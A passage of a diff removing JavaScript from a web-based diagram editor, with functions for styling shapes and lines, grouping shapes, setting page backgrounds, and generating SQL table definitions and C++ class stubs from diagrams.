-    str += '<tr><td align=right onclick=addmorenum(this)  >+++</td></tr>';
-    str += '</table>';
-
-    x.innerHTML = str;
-    document.body.appendChild(x);
-    var y1 = x.offsetHeight/arr.length;
-    if (arr[0] < 0) j = arr.length/2;
-    var y = xy[1] - y1*j;
-    if (y < 30) y = 30;
-    x.style.top = y + 'px';
-}
-function changetm(td,num,cd)
-{
-    if (selectedtds['o'] != null || selectedtds['z'] != null || selectedtds['do'] != null || selectedtds['dt'] != null) return;
-    var has = true;
-    td.style.backgroundColor = '#777777';
-    if (selectedtds['t'] == null)
-    {
-        selectedtds['t']  = [];
-        numaredoing= [];
-        has = false;
-    }
-    for (var i=0; i < selectedtds['t' ].length; i++)
-    if (td ==  selectedtds['t' ][i])
-    {
-        if (selectedtds['t' ].length==1)
-            selectedtds['t' ]  = null;
-        else
-            selectedtds['t' ].splice(i, 1);
-        td.style.backgroundColor = '#ffffff';
-        numaredoing.splice(i, 1);
-        return;
-    }
-    selectedtds['t'][selectedtds['t'].length] = td;
-    numaredoing[numaredoing.length] = num + 1000*cd;
-    var arr = [];
-    var k = parseInt(td.innerHTML);
-    k -= 10;
-    if (k < 0) k = 0;
-    itemaredoing = 't';
-     for (var i=0; i < 20; i++ )
-        arr[arr.length] = k+i;
-
-    if (!has)selectnum(td,arr);
-}
-
-
-function changeplaytime(td)
-{
-    numaredoing = [];
-    itemaredoing = 'p';
-    var k = parseInt(td.innerHTML) - 10;
-    if (k < 0) k=0;
-    var arr = [];
-    for (var i=0; i < 20; i++)
-        arr[arr.length] = i  + k;
-    selectnum(td,arr);
-}
-var selectedtds = new Array();
-function changeZ(td,num,cd)
-{
-    if (selectedtds['o'] != null || selectedtds['t'] != null || selectedtds['do'] != null || selectedtds['dt'] != null) return;
-    var has = true;
-    td.style.backgroundColor = '#777777';
-    if (selectedtds['z'] == null)
-    {
-        selectedtds['z']  = [];
-        has = false;
-    }
-    for (var i=0; i < selectedtds['z'].length; i++)
-        if (td ==  selectedtds['z'][i])
-    {
-        if (selectedtds['z' ].length==1)
-            selectedtds['z' ]  = null;
-        else
-            selectedtds['z' ].splice(i, 1);
-        td.style.backgroundColor = '#ffffff';
-        numaredoing.splice(i, 1);
-        return;
-    }
-    selectedtds['z'][selectedtds['z'].length] = td;
-    numaredoing[numaredoing.length] = num + 1000*cd;
-    itemaredoing = 'z'
-    var arr = [];
-    for (var i=0; i < numShapes + numLines + numCurves; i++)
-        arr[arr.length] = i;
-    arr[arr.length] = 110;
-    arr[arr.length] = 111;
-    arr[arr.length] = 112;
-    arr[arr.length] = 113;
-    if (!has)selectnum(td,arr);
-}
-function changedecimal(td,num,x,cd)
-{
-     if (selectedtds['z'] != null || selectedtds['o'] != null || selectedtds['t'] != null || selectedtds['do'] != null&&x=='t' || selectedtds['dt'] != null&&x=='o') return;
-    var has = true;
-    if (selectedtds['d'+x] == null)
-    {
-        selectedtds['d'+x]  = [];
-        has = false;
-    }
-    for (var i=0; i < selectedtds['d'+x].length; i++)
-    if (td ==  selectedtds['d'+x][i])
-    {
-        if (selectedtds['d'+x].length==1)
-            selectedtds['d'+x]  = null;
-        else
-            selectedtds['d'+x].splice(i, 1);
-        td.style.backgroundColor = '#ffffff';
-        numaredoing.splice(i, 1);
-        return;
-    }
-    selectedtds['d'+x][selectedtds['d'+x].length] = td;
-    numaredoing[numaredoing.length] = num + 1000*cd;
-    itemaredoing = 'd'+x;
-    td.style.backgroundColor = '#777777';
-    var arr = [];
-
-    for (var i=0; i < 10; i++)
-        arr[arr.length] = i;
-    if (!has) selectnum(td,arr);
-}
-function changeord(td,num,cd)
-{
-     if (selectedtds['z'] != null || selectedtds['t'] != null || selectedtds['do'] != null || selectedtds['dt'] != null) return;
-    var has = true;
-    td.style.backgroundColor = '#777777';
-    if (selectedtds['o'] == null)
-    {
-        has = false;
-        selectedtds['o']  = [];
-    }
-    for (var i=0; i < selectedtds['o'].length; i++)
-     if (td ==  selectedtds['o' ][i])
-    {
-        if (selectedtds['o' ].length==1)
-            selectedtds['o' ]  = null;
-        else
-            selectedtds['o' ].splice(i, 1);
-        td.style.backgroundColor = '#ffffff';
-        numaredoing.splice(i, 1);
-        return;
-    }
-    selectedtds['o'][selectedtds['o'].length] = td;
-    numaredoing[numaredoing.length] = num + 1000*cd;
-    itemaredoing = 'o';
-    var k = parseInt(td.innerHTML);
-    k -= 10;
-    if (k<0) k = 0;
-    var arr = [];
-    for (var i=0; i < 20; i++ )
-        arr[arr.length] = k+i;
-    if (!has)
-        selectnum(td,arr);
-}
-
-function showoptions(sel)
-{
-
-   //if(navigator.userAgent.indexOf("Chrome")>=0)
-   {
-      var xys = findPositionnoScrolling(sel, window);
-      var tbl = document.createElement('table');
-      tbl.style.border = "1px #b0b0b0 outset";
-      for (var i=0; i < sel.options.length; i++)
-      {
-          var row=tbl.insertRow(i);
-         var cell=row.insertCell(0);
-         if (i==0)cell.innerHTML = '&nbsp;&nbsp;';
-         else
-             cell.innerHTML = sel.options[i].text;
-         cell.onclick = function() {pickthis(this);}
-
-      }
-      tbl.style.zIndex = '30';
-      tbl.style.position = 'absolute';
-      tbl.style.top = xys[1] +'px';
-      tbl.style.left = xys[0] + 'px';
-      document.body.appendChild(tbl);
-   }
-}
-function changelinetype(i,num,cd)
-{
-    hassaved = false;
-
-    for (var j=0; j < numsselected.length; j++)
-    {
-        num = numsselected[j];
-        if (cd== 4)
-        {
-            allCurves[num].remove();
-            allCurves[num].type = arrows[i];
-            allCurves[num].draw();
-        }
-        else
-        {
-            allLines[num].remove();
-            allLines[num].type = arrows[i];
-            allLines[num].draw();
-        }
-        sendObject(num);
-    }
-}
-function changethick(i, num,cd)
-{
-    hassaved = false;
-    cachedlinethick = i;
-    if (numsselected==null)
-    {
-           numsselected = [];
-    }
-    for (var j=0; j < numsselected.length; j++)
-    {
-        num = numsselected[j];
-        if (cd== 4)
-        {
-            allCurves[num].thick = i;
-            allCurves[num].redraw();
-        }
-        else
-        {
-            allLines[num].thick = i;
-            allLines[num].redraw();
-        }
-        sendObject(num);
-    }
-}
-function changeframewidth(num , fcchecked,td)
-{
-    hassaved = false;
-    td.style.borderWidth = '1px'
-    if (fcchecked)
-        td.parentNode.nextSibling.cells[0].style.borderWidth = '0px';
-    else
-        td.parentNode.previousSibling.cells[0].style.borderWidth = '0px';
-    for (var i=0; i < numsselected.length; i++)
-    {
-        num = numsselected[i];
-        var j = allShapes[num].fc;
-        if (fcchecked &&  (j & 1) == 0)
-            j++;
-        else if (fcchecked == false && (j & 1) == 1)
-            j--;
-        cachedfc = j;
-        allShapes[num].fc = j;
-        if (allShapes[num].shapename!='clouds')
-        {
-            allShapes[num].reinit();
-            sendObject(num);
-        }
-    }
-}
-function changegradient(num, fcchecked,td)
-{
-      hassaved = false;
-    td.style.borderWidth = '1px';
-    if (fcchecked)
-        td.parentNode.nextSibling.cells[3].style.borderWidth = '0px';
-    else
-        td.parentNode.previousSibling.cells[3].style.borderWidth = '0px';
-    for (var i=0; i < numsselected.length; i++)
-    {
-        num = numsselected[i];
-        var z = allShapes[num];
-        var j = z.fc;
-        if (fcchecked &&  (j & 8) == 0)
-            j += 8;
-        else if (fcchecked == false && (j & 8) == 8)
-            j -= 8;
-        cachedfc = j;
-        z.fc = j;
-
-        if (z.isrect() && (z.ispic ==0||z.ispic ==3))
-        {
-            if ( (j & 8) > 0)
-            {
-                 z.base.style.backgroundImage =  gradient(bcolors[z.bcolor],z.shapename);
-                 z.base.style.backgroundColor =  'transparent';
-            }
-            else
-            {
-                 z.base.style.backgroundImage =  null;
-                 z.base.style.backgroundColor =  bcolors[z.bcolor];
-            }
-        }
-        else if (z.shapename == 'diamond')
-        {
-              var dv =  $('g' + z.num);
-              dv = dv.getElementsByTagName('div')[0];
-              if ( (j & 8) == 8)
-              {
-                  dv.style.backgroundImage = gradient(bcolors[z.bcolor]);
-                  dv.style.backgroundColor =  null;
-
-              }
-              else
-              {
-                  dv.style.backgroundColor =  bcolors[z.bcolor];
-                  dv.style.backgroundImage = null;
-              }
-        }
-        else if (z.shapename == 'hexgon')
-        {
-              var dv =  $('g' + z.num);
-              if ( (j & 8) == 8)
-              {
-                  var bf = gradient(bcolors[z.bcolor]).replace(/\(/,'(to right,');
-
-                  var twocolors = bf.replace(/[^#]+(#[0-9|a-f]+)[^#]+(#[0-9|a-f]+).*/,'$1,$2').split(/,/);
-                  var tr = dv.getElementsByTagName('table')[0].rows[0];
-
-                  tr.cells[0].getElementsByTagName('div')[0].style.borderRightColor = twocolors[0];
-                  tr.cells[1].style.background   = bf;
-                  tr.cells[2].getElementsByTagName('div')[0].style.borderLeftColor = twocolors[1];
-
-              }
-              else
-              {
-                  var tr = dv.getElementsByTagName('table')[0].rows[0];
-                  tr.cells[0].getElementsByTagName('div')[0].style.borderRightColor = bcolors[z.bcolor];
-                  tr.cells[2].getElementsByTagName('div')[0].style.borderLeftColor = bcolors[z.bcolor];
-                  tr.cells[1].style.background   = null;
-                  tr.cells[1].style.backgroundColor =bcolors[z.bcolor];
-              }
-        }
-
-        sendObject(num);
-    }
-}
-function circulartext(num,span)
-{
-    var cl = hexcolor(span.style.color);
-    if (cl == '#0000cc') //true
-    {
-        allShapes[num].urlas = '';
-        span.style.color = '#666699';
-    }
-    else
-    {
-        allShapes[num].urlas = 'circular';
-        span.style.color = '#0000cc';
-    }
-    done(num);
-}
-function whichally(num,cd)
-{
-    if (allies[pagenum] == null)
-    {
-       allies[pagenum] = [];
-    }
-    for (var i=0; i < allies[pagenum].length; i++)
-    {
-        if (cd==1 && allies[pagenum][i].charAt(0)!='c' && ("," + allies[pagenum][i] + ",").indexOf(',' + num + ",") >= 0)
-            return i;
-        else if (cd==4 && allies[pagenum][i]!=null && allies[pagenum][i].charAt(0)=='c' && ("," + allies[pagenum][i] + ",").indexOf(',' + num + ",") >= 0)
-            return i;
-    }
-    return -1;
-}
-function selally(td,num,cd)
-{
-    var i = whichally(num,cd);
-    if (cd==1 && i >-1)
-    {
-        var moresel = allies[pagenum][i].split(/,/);
-        var cc = false;
-        for (var j=0; j < moresel.length; j++)
-        {
-            var k = parseInt(moresel[j]);
-            for (var l=0; l < numsselected.length; l++)
-                if (numsselected[l] == k) break;
-            if (l == numsselected.length)
-            {
-                numsselected[l] = k;
-                cc = true;
-            }
-        }
-
-        if (cc)  $("m" + num + "_" + cdbeing).style.boxShadow = "-" + (numsselected.length*2-2) + "px -" + (numsselected.length-1) + "px #777";
-    }
-    else if (cd==4 && i >-1)
-    {
-        var moresel = allies[pagenum][i].split(/,/);
-        var cc = false;
-        for (var j=1; j < moresel.length; j++)
-        {
-            var k = parseInt(moresel[j]);
-            for (var l=0; l < numsselected.length; l++)
-                if (numsselected[l] == k) break;
-            if (l == numsselected.length)
-            {
-                numsselected[l] = k;
-                cc = true;
-            }
-        }
-
-        if (cc)  $("m" + num + "_" + cdbeing).style.boxShadow = "-" + (numsselected.length*2-2) + "px -" + (numsselected.length-1) + "px #777";
-    }
-     td.innerHTML = '';
-     
-}
-var exithold = [];
-function exitally1(td,num,cd)
-{
-        var i = whichally(num,cd);
-        if (i==-1) return;
-        allies[pagenum][i] = allies[pagenum][i].replace(new RegExp("," + num + ","),",").replace(new RegExp("^" + num + ","),"").replace(new RegExp("," + num + "$"),"");
-        if (cd==1 && (allies[pagenum][i] == '' || allies[pagenum][i].indexOf(",")==-1))
-        {
-            allies[pagenum].splice(i,1);
-        }
-        else if (cd==4 && (allies[pagenum][i].replace(/[0-9]/,'')==allies[pagenum][i]))
-        {
-            allies[pagenum].splice(i,1);
-        }
-        td.innerHTML = '';
-}
-function formally(num,cd)
-{
-    if (cd == 1)
-    {
-    var ww = '';
-    var i = -1;
-    for (var j=0; j < numsselected.length; j++)
-    {
-        num = numsselected[j];
-        i = whichally(num,cd);
-        if (i > -1)
-        {
-            ww +=  "," + allies[pagenum][i];
-            allies[pagenum][i] = null;
-        }
-        else
-            ww += "," + num;
-    }
-    if (i > -1)
-        allies[pagenum][i] = ww.substring(1);
-    else
-        allies[pagenum][allies[pagenum].length] = ww.substring(1);
-    for (var k= allies[pagenum].length-1; k >=0; k--)
-        if (allies[pagenum][k] == null)
-            allies[pagenum].splice(k,1);
-    }
-    else
-    {
-    var ww = 'c';
-    var i = -1;
-    for (var j=0; j < numsselected.length; j++)
-    {
-        num = numsselected[j];
-        i = whichally(num,cd);
-        if (i > -1)
-        {
-            ww +=  "," + allies[pagenum][i].replace(/^c,/,'');
-            allies[pagenum][i] = null;
-        }
-        else
-            ww += "," + num;
-    }
-    if (i > -1)
-        allies[pagenum][i] = ww;
-    else
-        allies[pagenum][allies[pagenum].length] = ww;
-    for (var k= allies[pagenum].length-1; k >=0; k--)
-        if (allies[pagenum][k] == null)
-            allies[pagenum].splice(k,1);
-    }
-    canceldia(num,1);
-}
-function changeslope(num, x)
-{
-      hassaved = false;
-
-    for (var i=0; i < numsselected.length; i++)
-    {
-        num = numsselected[i];
-        var z = allShapes[num];
-        if (isNaN(x.value))
-        {
-            x.value = ''+z.slope;
-            return;
-        }
-        z.slope = parseFloat(x.value);
-        allShapes[num].reinit();
-        sendObject(num);
-    }
-}
-function changeTshadow(num, fcchecked,td)
-{
-    td.style.borderWidth = "1px";
-    if (fcchecked)
-        td.parentNode.nextSibling.cells[2].style.borderWidth = '0px';
-    else
-        td.parentNode.previousSibling.cells[2].style.borderWidth = '0px';
-    for (var i=0; i < numsselected.length; i++)
-    {
-        num = numsselected[i];
-        var j = allShapes[num].fc;
-        if (fcchecked && (j & 4) == 0)
-            j+=4;
-        else if (fcchecked == false && (j & 4) > 0)
-            j-=4;
-        allShapes[num].fc = j;
-        cachedfc = j;
-        if ( (j&4) == 4)
-           allShapes[num].base.style.textShadow = (colors[allShapes[num].color]=='blue'? '1px 1px #111111':'1px 1px #505050');
-        else
-           allShapes[num].base.style.textShadow =  null;
-        sendObject(num);
-    }
-}
-function changeshadow(num , fcchecked,td)
-{
-    hassaved = false;
-    td.style.borderWidth = "1px";
-    if (fcchecked)
-        td.parentNode.nextSibling.cells[1].style.borderWidth = '0px';
-    else
-        td.parentNode.previousSibling.cells[1].style.borderWidth = '0px';
-    for (var i=0; i < numsselected.length; i++)
-    {
-        num = numsselected[i];
-        var j = allShapes[num].fc;
-        if (fcchecked && (j & 2) == 0)
-            j+=2;
-        else if (fcchecked == false && (j & 2) > 0)
-            j-=2;
-        cachedfc = j;
-        allShapes[num].resize();
-        allShapes[num].visible = 1;
-        allShapes[num].fc = j;
-        allShapes[num].init();
-        sendObject(num);
-    }
-}
-
-function setdocbg(tv)
-{
-    document.body.className = null;
-    tv = tv.replace(/ /g,'');
-    if (tv.length > 14)
-    {
-        hassaved = false; var xs;
-        if (tv.indexOf('http') == 0)
-            document.body.style.backgroundImage = "url(" + tv +")";
-        else if (tv.charAt(0)=='#')
-            document.body.style.backgroundImage = "linear-gradient(to right," + tv +")";
-        else if( (xs = tv.split(/ /)).length>1)
-        {
-            document.body.style.backgroundImage = null;
-            document.body.style.backgroundColor = xs[1];
-            document.body.className = 'shapebg' +  xs[0] ;
-        }
-        bgarr[pagenum] = tv;
-    }
-    else if( (xs = tv.split(/ /)).length>1)
-    {
-            document.body.style.backgroundImage = null;
-            document.body.style.backgroundColor = xs[1];
-            document.body.className = 'shapebg' +  xs[0] ;
-    }
-    else if (!isNaN(tv))
-    {
-        document.body.style.backgroundImage = null;
-        document.body.className = 'shapebg' + tv;
-    }
-    else
-        document.body.style.backgroundImage = null;
-
-    if (chatsessionnum > -1  )
-    {
-        parent.sendObject(chatsessionnum,'b' + tv);
-    }
-    canceldia(0,1);
-
-}
-function setdocbg1()
-{
-    var tv = bgarr[pagenum]; 
-    if (tv==null || tv=='') return ['',''];
-    tv = tv.replace(/ /g,'');
-    var qq = [];
-    if (tv.length > 14)
-    {
-        var xs;
-        if (tv.indexOf('http') == 0)
-            return ['', "background-image:url(" + tv +")"];
-        if (tv.charAt(0)=='#')
-        {
-            tv = tv.replace(/(,[^,]+),.*/,"$1");
-            return ["","background-image:linear-gradient(to right," + tv +")"];
-        }
-        else if( (xs = tv.split(/ /)).length>1)
-        {
-            return ["class=shapebg" +  xs[0],"background-color:" + xs[1]] ;
-        }
-        
-    }
-    else if( (xs = tv.split(/ /)).length>1)
-    {
-          return   ["class=shapebg" +  xs[0],"background-color:" + xs[1]] ;
-    }
-    else if (!isNaN(tv))
-    {
-        return ['class=shapebg' +  tv + " ",''];
-    }
-    return ['',"background-color:#BBB"];
- 
-}
-function getdocbg()
-{
-   var cn = document.body.className;
-   if (cn == null || cn == 'null' || cn.indexOf('style')==0)
-   {
-   var xx =  document.body.style.backgroundImage;
-   if (xx == null) return '';
-
-   xx = xx.replace(/[^\(]*\(/,'').replace(/\)[^\)]*$/,'');
-   xx = xx.replace(/to right,/, '')
-   xx = xx.replace(/"/g, '');
-   if (xx.indexOf(',') > 0)
-   {
-       var xs = xx.split(/\),/);
-       xx = '';
-       for (var yy in xs)
-           xx +=   "," + hexcolor(xs[yy].replace(/\)$/,'') + ')');
-       xx = xx.substring(1);
-   }
-   bgarr[pagenum] = xx;
-   return xx;
-   }
-   else
-   {
-       var bg = cn.replace(/shapebg/,'');
-       var xx = hexcolor(document.body.style.backgroundColor);
-       if (xx.charAt(0) =='#')
-          bg += " " + xx;
-       return bg;
-   }
-}
-
-
-function dosql(num)
-{
-   hassaved = false;
-   var s = '';
-   for (var j=0; j < numsselected.length; j++)
-    {
-        num = numsselected[j];
-       var str = allShapes[num].words.replace(/\r/g,'');
-       var a = str.split( /[\n|\s]*\n[\n|\s]*/);
-       s += "CREATE TABLE " + a[0] + "\n(";
-        if (a[1]!='lastupdate') s += "\n   lastupdate BigInt,\n";
-       for (var i=1; i < a.length; i++)
-       {
-           a[i] = a[i].replace("^[ ]+", "").replace(/[ ]+$/,'');
-           if (a[i].indexOf(" ")<0)
-               s += "   " + a[i].replace(/<b>/ig,"").replace(/<.b>/ig,"") + " VARCHAR(50),\n";
-           else
-               s += "   " + a[i].replace(/<b>/ig,"").replace(/<.b>/ig,"") + ",\n";
-       }
-
-       var p = '';
-       for (i=1; i < a.length; i++)
-       {
-           a[i] = a[i].replace(/<b>/i,'').replace(/<.b>/i,'');
-           var j = str.indexOf(a[i]);
-           var k = str.substring(0,j).lastIndexOf("</b>");
-           var l = str.substring(0,j).lastIndexOf("<b>");
-           if (l < 0 || l > k && k>=0) continue;
-           k = str.indexOf("</b>", j);
-           l = str.indexOf("<b>",  j);
-           if (k < 0 || l < k && l>=0) continue;
-           p += "," + a[i].replace(/<b>/ig,'').replace(/<.b>/ig,'');
-       }
-       if (p!='')
-       s +=   "   PRIMARY KEY(" + p.substring(1) +")";
-
-       var maps = new Array();
-       var mape = new Array();
-       var alltbl = new Array();
-       for (i=0; i < allLines.length; i++)
-       {
-           if (allLines[i] == null) continue;
-           if (allLines[i].endnum != num) continue;
-           var tbl = tblname(allLines[i].startnum);
-           if (maps[tbl]==null) maps[tbl] = '';
-           if (mape[tbl]==null) mape[tbl] = '';
-           alltbl[alltbl.length] = tbl;
-           var startfn = fdname(allLines[i].startnum, allLines[i].sy);
-           var endfn   = fdname(allLines[i].endnum,   allLines[i].ey);
-           maps[tbl] = maps[tbl] + "," + startfn;
-           mape[tbl] = mape[tbl] + "," + endfn;
-       }
-       for (i=0; i < alltbl.length; i++)
-       {
-           tbl = alltbl[i];
-           s += ",\n   FOREIGN KEY (" + mape[tbl].substring(1) + ") REFERENCES " + tbl + "(" + maps[tbl].substring(1) +")";
-
-       }
-       s += "\n)";
-       if (j < numsselected.length-1)
-           s += "\n\n";
-    }
-   if (savesqlable())
-       myprompt( "<textarea name=def id=\"def" + num +"\" rows=20 cols=60>" + s +"</textarea><br><center><input type=hidden name=tname value=\"" + a[0] +"\"><input name=submit style=\"width:70px;height:22px;border:1px #b0b0b0 outset\" value=GoPhysical type=button onclick=\"gophysical('" + a[0] +"'," + num + ")\"></center>",null,null,textmsg[797]);
-   else
-       myprompt(textmsg[1658] + ":<br><textarea id=\"savesql\" rows=20 cols=60>" + s  +"</textarea>",null,null,textmsg[797]);
-
-
-}
-function gophysical(tname,num)
-{
-
-    parent.frames[0].savedef(tname, $("def" + num).value);
-    whichact = 'sql';
-    hassaved = false;
-    tnamebeing = tname;
-}
-function docpp(num)
-{
-
-   hassaved = false;
-   canceldia(0,0);
-   var inh = '';
-   if(numsselected==null || numsselected.length ==0)
-       numsselected = [num];
-   for (var j=0; j < numsselected.length; j++)
-   {
-        num = numsselected[j];
-   for (var i=0; i < numLines; i++)
-   {
-       if (allLines[i] == null)continue;
-       if (allLines[i].startnum==  num && allLines[i].type== 'arrow')
-       {
-           if (inh!='') inh += ",";
-           inh += tblname(allLines[i].endnum);
-       }
-   }
-
-   var str = allShapes[num].words;
-   var a = str.split(/\n/);
-   var s = "public class " + a[0];
-   if (inh !='')
-   {
-       s += " : public " + inh;
-   }
-   s += "\n{\n";
-
-   var st = 'data';
-   var alltbl = new Array();
-   for (  i=0; i < allLines.length; i++)
-   {
-       if (allLines[i] == null) continue;
-       if (allLines[i].endnum != num || allLines[i].type!='diamond') continue;
-       var tbl = tblname(allLines[i].startnum);
-       var endfn   = fdname(allLines[i].endnum, allLines[i].ey);
-       endfn   = endfn.replace("^[ ]+", "").replace(/[ ]+$/,'').replace(/\r/,'').replace(/<b>/ig,"").replace(/<.b>/ig,"");
-       alltbl[endfn] = tbl;
-   }
-
-   for ( i=2; i < a.length; i++)
-   {
-       var v = a[i].replace("^[ ]+", "").replace(/[ ]+$/,'').replace(/\r/,'').replace(/<b>/ig,"").replace(/<.b>/ig,"");
-       if (i>=2&& v== ''){st = 'method';continue;}
-
-       if (v.indexOf(" ")<0)
-       {
-           if (st== 'data')
-           {
-              tbl = alltbl[v];
-              if (tbl!=null) s += "   " + tbl + "* " + v + ";\n";
-              else
-                  s += "   string " + v + ";\n";
-           }
-           else
-              s += "   void " + v + "();\n";
-       }
-       else
-       {
-           if (st== 'data')
-           {
-               s += "   " + v  + ";\n";
-           }
-           else
-              s += "   " + v + "();\n";
-       }
-   }
-
-   s += "\n};";
-   if (i < numsselected.length-1)
-       s += "\n\n";
-   }
-   if (saveable())
-       myprompt( "<textarea id=\"destination" + num +"\" rows=20 cols=60>" + s +"</textarea><br><center><input size=8 name=filedir value=\"" + a[0] +".h\" ><input name=submit  style=\"width:50px;height:22px;border:1px #b0b0b0 outset\" value=\"" + textmsg[67] + "\" type=button onclick=\"savehfile('" + a[0] +".h'," + num + ")\"></center>",null,null, textmsg[797]);
-   else
-       myprompt(textmsg[1659] + ":<textarea id=\"destination\" rows=20 cols=60>" +s + "</textarea>");
-
-   canceldia(0,0);
-   canceldia(num,1);
-}
-function savehfile(fn, num)
-{
-    opener.helpsave(window, fn, $("destination"+ num).value);
-}
-function fdname(num, y)
-{
-    var s = allShapes[num].words.split(/\n/);
-    var z = Math.round(y*s.length + 0.5);
-    return s[z].replace(/<[^>]*>/g,"");
-}
-
-function tblname(num)
-{
-   var s = allShapes[num].words.replace(/\r/g,'').replace(/^[\s|\n]+/,'');
-   var j = s.indexOf("\n");
-   if (j>0)
-   return s.substring(0,j);
-   return s;
-
-}
-function issql(s)
-{
-    s = s.replace(/\r/g, '');
-    s = s.replace(/[ ]*\n[ ]*/g, '\n');
-    s = s.replace(/^\s+/g, '');
-    s = s.replace(/\s+$/g, '');
-    var j = s.indexOf("\n\n");
-    if (j < 0) return false;
-    if (s.indexOf("<b>") < 0)
-        return false;
-    j = s.indexOf("\n\n",j+3);
-    if (j > 0) return false;
-    return true;
-}
-function iscpp(s)
-{
-
-    s = s.replace(/\r/g, '');
-    s = s.replace(/[ ]+\n/g, '\n');
-    s = s.replace(/^\s+/g, '');
-    var j = s.indexOf("\n\n");
-    if (j < 0) return false;
-    if (s.indexOf("<b>") >= 0)
-        return false;
-    j = s.indexOf("\n\n",j+3);
-    if (j < 0) return false;
-    return true;
-}
-function switchshow(num)
-{
-    allShapes[num].visible = 1 - allShapes[num].visible;
-    hideshow(num);
-}
-function hideshow(num)
-{
-    if (num < 0 || num >= numShapes || allShapes[num] == null) return;
-
-    //allShapes[num].visible = 1 - allShapes[num].visible;
-    allShapes[num].base.style.visibility = (allShapes[num].visible== 1)? 'visible':'hidden';
-    
-    if (allShapes[num].visible==1)
-    {
-        for (var j=0; j < numLines; j++)
-            if (allLines[j]!=null && (allLines[j].endnum == num || allLines[j].endnum==-1 && allLines[j].startnum == num))
-                allLines[j].draw();
-    }
-    else
-    {
-        for (var j=0; j < numLines; j++)
-            if (allLines[j].startnum == num || allLines[j].endnum == num)
-                allLines[j].remove();
-    }
-    //allShapes[num].base.style.visibility  = (allShapes[num].visible== 1)? 'visible':'hidden';
-    document.onmousemove = onmouseover0;
-
-}
-
-function hideLine(num)
-{
-    if (num < 0 || num >= numLines || allLines[num]==null) return;
-
-    allLines[num].visible = 1 - allLines[num].visible;
-    if (allLines[num].visible)
-       allLines[num].draw();
-    else
-       allLines[num].remove();
-    document.onmousemove = onmouseover0;
-
-}
-
-function hideCurve(num)
-{
-
-    allCurve[num].visible = 1 - allCurve[num].visible;
-    allCurve[num].base.style.visibility = (allCurve[num].visible== 1)? 'visible':'hidden';
-
-    document.onmousemove = onmouseover0;
-
-}
-
-
-function redraw3(num,shapename,cd)
-{
-    cachedshapename = shapename;
-    if (cd== 1)
-    {
-        hassaved = false;
-        savedfontrate = 1;
-        if (numsselected ==null || numsselected.length==0)
-            numsselected = [num];
-        for (var j=0; j < numsselected.length; j++)
-        {
-            var num = numsselected[j];
-            allShapes[num].resize();
-            allShapes[num].shapename = shapename;
-            allShapes[num].visible = 1;
-            allShapes[num].init();
-            for (var i=0; i < numLines; i++)
-        {
-          if (allLines[i]!=null &&  allLines[i].startnum ==  num   )
-          {
-             allLines[i].sx = Math.round(allLines[i].sx*savedfontrate);
-             allLines[i].sy = Math.round(allLines[i].sy*savedfontrate);
-             allLines[i].redraw();
-          }
-          if (allLines[i]!=null &&   allLines[i].endnum ==  num )
-          {
-             allLines[i].ex = Math.round(allLines[i].ex*savedfontrate);
-             allLines[i].ey = Math.round(allLines[i].ey*savedfontrate);
-             allLines[i].redraw();
-          }
-        }
-        }
-
-        mdia(num,cd);
-   }
-   else if (cd== 0)
-   {
-       if (chatsessionnum== -1)
-       {
-           anewshape(num,shapename);
-       }
-       else
-       {
-           cachedshapenum = num;
-
-           parent.sendObject(chatsessionnum,'s');
-       }
-   }
-
-   document.onmousemove = onmouseover0;
-}
-function anewshape(num,shapename)
-{
-   if (num == null)
-   {
-       num  = cachedshapenum;
-       shapename = cachedshapename;
-   }
-   var dv = $("m0_0"); var z;
-   if (dv==null)
-      z = new Shape(num, '','', shapename, 30, 100, null, null, parseInt(cachedfontsize.replace(/px/i,'')), cachedcolor, cachedbgcolor,cachedfc,0,num,num);
-   else
-      z = new Shape(num, '','', shapename, parseInt(dv.style.left.replace(/px/,'')), parseInt(dv.style.top.replace(/px/,''))+70, null, null, parseInt(cachedfontsize.replace(/px/i,'')), cachedcolor, cachedbgcolor,cachedfc,0,num,num);
-   z.visible = 1;
-   canceldia(num,0);
-
-   if (numediting==-1)
-   {
-       allShapes[num] = z;
-       numShapes = allShapes.length;
-       action(null,num);
-   }
-   else
-   {
-       z.initbase();
-       z.init();
-       z.setup();
-   }
-   cachedshapenum = null;
-
-}
-function edit(num)
-{
-    if (chatsessionnum== -1)
-    {
-       // urlas = allShapes[num].urlas;
-        numbeing = num;
-        action(allShapes[num].base,num);
-    }
-    else
-    {
-         if (allShapes[num].inediting== false)
-         {
-             if (allShapes[num].word != '')
-             {
-                 sendObject(num,'u');
-             }
-            // urlas = allShapes[num].urlas;
-             numbeing = num;
-             action(allShapes[num].base,num);
-         }
-    }
-    canceldia(num,1);
-}
-
-function holdtomodify(num)
-{
-    return;
-    if (num < 0 || allShapes[num] == null) return;
-   // allShapes[num].inediting = true;
-    if (numediting== num)
-    {
-        var b = $("t" + num);
-        document.body.removeChild(b);
-        numediting = -1;
-        myprompt(textmsg[1657]);
-
-    }
-}
-function delpic(num,im)
-{
-    beingloadnum = num;
-    if (im!=null )
-        submitstring = "delpic(beingloadnum,'" + im + "')";
-    else
-        submitstring = "delpic(beingloadnum)";
-
-    hassaved = false;
-    if (saveable())
-    {
-    if (im==null)
-    {
-        var img = allShapes[num].base.getElementsByTagName("img")[0];
-        im = img.alt;
-        allShapes[num].words = allShapes[num].words.replace(/<img [^>]+>/,'');
-        done(num);
-        canceldia(num,1);
-        if ( img.src.indexOf(originalurl + "/FileOperation?did=")!=0)
-            return;
-    }
-    if (im == null || im== '' || im.indexOf(".") < 0 ) return;
-    var fn = (folder== '')? (im ): (folder + "/" + im );
-
-    {
-    document.f.operation.value = "delete";
-    document.f.destination.value = "";
-    document.f.filedir.value = fn  ;
-    formnewaction(document.f, originalurl + "/FileOperation");
-    document.f.target = iframename ;
-    expiretime = activeidletime + (new Date()).getTime();
-    visual(document.f);
-    document.f.submit();
-    document.f.filedir.value = filename;
-    document.title = filename;
-    }
-    }
-    else
-    {
-        allShapes[num].words = allShapes[num].words.replace(/<img [^>]+>/,'');
-        done(num);
-    }
-    document.onmousemove = onmouseover0;
-}
-
-function changefont(sel,num, cd ,ii)
-{
-    var fs = parseInt(sel.innerHTML);
-    if (cd == 1)
-    {
-        hassaved = false;
-        hassaved = false;
-        var tbl = sel.parentNode.parentNode;
-        if (tbl.tagName.toLowerCase() != 'table')
-        {
-            tbl = sel.parentNode.parentNode.parentNode;
-        }
-        for (var j=0; j < tbl.rows.length; j++)
-           for (var i=0; i < tbl.rows[j].cells.length; i++)
-       {
-           tbl.rows[j].cells[i].style.fontWeight = '500';
